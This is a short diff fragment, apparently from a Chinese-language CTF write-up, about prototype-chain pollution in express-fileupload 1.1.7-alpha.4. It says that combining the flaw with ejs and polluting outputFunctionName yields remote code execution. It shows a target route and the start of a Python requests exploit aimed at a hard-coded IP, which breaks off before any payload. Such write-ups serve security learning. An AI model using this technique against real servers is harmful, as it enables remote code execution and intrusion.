@@ -264,6 +264,11 @@ package.json中存在jade。
 ## **express-fileupload原型链污染**
 "express-fileupload": "1.1.7-alpha.4"存在cve，配合ejs，污染ejs中outputFunctionName变量实现RCE
 ```
+app.post('/4_pATh_yOu_CaNNO7_Gu3ss', (req, res) => {
+       res.render(' flag.ejs');
+}):
+```
+```
 import requests
 
 resp1 = requests.post("http://{}:{}/{}".format('61.147.171.105', '52139', '4_pATh_y0u_CaNN07_Gu3ss'),
